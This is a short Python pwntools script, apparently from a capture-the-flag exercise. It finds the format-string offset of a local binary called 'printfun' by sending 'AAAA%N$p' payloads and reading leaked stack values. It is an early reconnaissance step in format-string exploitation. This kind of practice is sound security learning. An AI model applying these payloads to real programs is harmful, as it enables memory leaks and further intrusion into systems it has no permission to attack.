from pwn import *

def offset_finder():
    for x in range (1, 100):
        try:
            p = process("./printfun")
            
            print "Offset number {}".format(x)

            payload = ""
            payload += "A" * 4
            payload += "%{}$p".format(x)

            p.sendline(payload)
            
            p.recvuntil("User input:\n")
            stack_value = p.recvline()[4:-1]
            if stack_value.find("41414141") != -1:
                print "Offset found!"
                print "Stack value: {}".format(stack_value)
                break
            else:
                print "Stack value: {}".format(stack_value)
                
            p.close()
        except:
            pass

if __name__ == "__main__":
    offset_finder()